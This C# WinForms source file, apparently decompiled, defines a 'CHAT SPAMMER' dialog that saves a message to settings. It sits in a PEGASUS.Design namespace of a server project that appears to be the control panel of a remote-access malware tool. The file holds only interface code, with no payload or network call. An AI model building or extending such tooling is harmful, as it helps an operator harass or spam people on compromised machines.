using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Server.Properties;

namespace PEGASUS.Design
{
    public class FrmCSPM : Form
    {
        private IContainer components;

        private Guna2Panel guna2Panel1;

        private Guna2PictureBox guna2PictureBox1;

        private Guna2Separator guna2Separator1;

        private PictureBox pictureBox1;

        private Label label15;

        public Guna2GradientButton btnSend;

        private Label label3;

        private Guna2ShadowForm guna2ShadowForm1;

        private Guna2BorderlessForm guna2BorderlessForm1;

        private Guna2TextBox txtMessage;

        public FrmCSPM()
        {
            InitializeComponent();
        }

        private void btnSend_Click(object sender, EventArgs e)
        {
            if (!string.IsNullOrWhiteSpace(txtMessage.Text))
            {
                base.DialogResult = DialogResult.OK;
                global::Server.Properties.Settings.Default.message = txtMessage.Text;
                global::Server.Properties.Settings.Default.Save();
                Hide();
            }
        }

        private void FrmCSPM_Load(object sender, EventArgs e)
        {
            try
            {
                txtMessage.Text = global::Server.Properties.Settings.Default.message;
            }
            catch
            {
            }
        }

        private void guna2PictureBox1_Click(object sender, EventArgs e)
        {
            Close();
        }

        [DllImport("user32.DLL")]
        private static extern void ReleaseCapture();

        [DllImport("user32.DLL")]
        private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

        private void guna2Panel1_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(base.Handle, 274, 61458, 0);
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && components != null)
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FrmCSPM));
            guna2Panel1 = new Guna.UI2.WinForms.Guna2Panel();
            guna2PictureBox1 = new Guna.UI2.WinForms.Guna2PictureBox();
            guna2Separator1 = new Guna.UI2.WinForms.Guna2Separator();
            pictureBox1 = new System.Windows.Forms.PictureBox();
            label15 = new System.Windows.Forms.Label();
            btnSend = new Guna.UI2.WinForms.Guna2GradientButton();
            label3 = new System.Windows.Forms.Label();
            guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(components);
            guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(components);
            txtMessage = new Guna.UI2.WinForms.Guna2TextBox();
            guna2Panel1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)guna2PictureBox1).BeginInit();
            ((System.ComponentModel.ISupportInitialize)pictureBox1).BeginInit();
            SuspendLayout();
            guna2Panel1.Controls.Add(guna2PictureBox1);
            guna2Panel1.Controls.Add(guna2Separator1);
            guna2Panel1.Controls.Add(pictureBox1);
            guna2Panel1.Controls.Add(label15);
            guna2Panel1.Dock = System.Windows.Forms.DockStyle.Top;
            guna2Panel1.Location = new System.Drawing.Point(0, 0);
            guna2Panel1.Name = "guna2Panel1";
            guna2Panel1.ShadowDecoration.Parent = guna2Panel1;
            guna2Panel1.Size = new System.Drawing.Size(664, 72);
            guna2Panel1.TabIndex = 139;
            guna2Panel1.MouseDown += new System.Windows.Forms.MouseEventHandler(guna2Panel1_MouseDown);
            guna2PictureBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
            guna2PictureBox1.BackColor = System.Drawing.Color.Transparent;
            guna2PictureBox1.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox1.Image");
            guna2PictureBox1.ImageRotate = 0f;
            guna2PictureBox1.Location = new System.Drawing.Point(623, 12);
            guna2PictureBox1.Name = "guna2PictureBox1";
            guna2PictureBox1.ShadowDecoration.Parent = guna2PictureBox1;
            guna2PictureBox1.Size = new System.Drawing.Size(29, 27);
            guna2PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            guna2PictureBox1.TabIndex = 114;
            guna2PictureBox1.TabStop = false;
            guna2PictureBox1.UseTransparentBackground = true;
            guna2PictureBox1.Click += new System.EventHandler(guna2PictureBox1_Click);
            guna2Separator1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
            guna2Separator1.BackColor = System.Drawing.Color.Transparent;
            guna2Separator1.FillColor = System.Drawing.Color.FromArgb(36, 36, 36);
            guna2Separator1.Location = new System.Drawing.Point(-198, 66);
            guna2Separator1.Name = "guna2Separator1";
            guna2Separator1.Size = new System.Drawing.Size(1061, 11);
            guna2Separator1.TabIndex = 13;
            guna2Separator1.UseTransparentBackground = true;
            pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
            pictureBox1.Location = new System.Drawing.Point(12, 13);
            pictureBox1.Name = "pictureBox1";
            pictureBox1.Size = new System.Drawing.Size(40, 46);
            pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            pictureBox1.TabIndex = 12;
            pictureBox1.TabStop = false;
            label15.AutoSize = true;
            label15.Font = new System.Drawing.Font("Electrolize", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            label15.ForeColor = System.Drawing.Color.LightGray;
            label15.Location = new System.Drawing.Point(261, 20);
            label15.Name = "label15";
            label15.Size = new System.Drawing.Size(149, 19);
            label15.TabIndex = 11;
            label15.Text = "CHAT SPAMMER";
            btnSend.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
            btnSend.BorderThickness = 1;
            btnSend.CheckedState.Parent = btnSend;
            btnSend.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
            btnSend.CustomImages.Parent = btnSend;
            btnSend.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            btnSend.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            btnSend.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
            btnSend.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
            btnSend.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
            btnSend.DisabledState.Parent = btnSend;
            btnSend.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
            btnSend.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
            btnSend.Font = new System.Drawing.Font("Electrolize", 9f);
            btnSend.ForeColor = System.Drawing.Color.White;
            btnSend.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
            btnSend.HoverState.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
            btnSend.HoverState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
            btnSend.HoverState.ForeColor = System.Drawing.Color.LightGray;
            btnSend.HoverState.Parent = btnSend;
            btnSend.Location = new System.Drawing.Point(502, 332);
            btnSend.Name = "btnSend";
            btnSend.ShadowDecoration.Parent = btnSend;
            btnSend.Size = new System.Drawing.Size(136, 30);
            btnSend.TabIndex = 149;
            btnSend.Text = "Send";
            btnSend.Click += new System.EventHandler(btnSend_Click);
            label3.AutoSize = true;
            label3.Location = new System.Drawing.Point(20, 132);
            label3.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            label3.Name = "label3";
            label3.Size = new System.Drawing.Size(55, 14);
            label3.TabIndex = 151;
            label3.Text = "Message:";
            guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 37, 33);
            guna2ShadowForm1.TargetForm = this;
            guna2BorderlessForm1.ContainerControl = this;
            guna2BorderlessForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 37, 33);
            txtMessage.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
            txtMessage.Cursor = System.Windows.Forms.Cursors.IBeam;
            txtMessage.DefaultText = "";
            txtMessage.DisabledState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
            txtMessage.DisabledState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
            txtMessage.DisabledState.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
            txtMessage.DisabledState.Parent = txtMessage;
            txtMessage.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
            txtMessage.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
            txtMessage.FocusedState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
            txtMessage.FocusedState.Parent = txtMessage;
            txtMessage.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            txtMessage.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
            txtMessage.HoverState.Parent = txtMessage;
            txtMessage.Location = new System.Drawing.Point(23, 149);
            txtMessage.Name = "txtMessage";
            txtMessage.PasswordChar = '\0';
            txtMessage.PlaceholderText = "";
            txtMessage.SelectedText = "";
            txtMessage.ShadowDecoration.Parent = txtMessage;
            txtMessage.Size = new System.Drawing.Size(615, 177);
            txtMessage.TabIndex = 152;
            base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 14f);
            base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
            base.ClientSize = new System.Drawing.Size(664, 403);
            base.Controls.Add(txtMessage);
            base.Controls.Add(label3);
            base.Controls.Add(btnSend);
            base.Controls.Add(guna2Panel1);
            Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            ForeColor = System.Drawing.Color.LightGray;
            base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            base.Name = "FrmCSPM";
            Text = "FrmCSPM";
            base.Load += new System.EventHandler(FrmCSPM_Load);
            guna2Panel1.ResumeLayout(false);
            guna2Panel1.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)guna2PictureBox1).EndInit();
            ((System.ComponentModel.ISupportInitialize)pictureBox1).EndInit();
            ResumeLayout(false);
            PerformLayout();
        }
    }
}
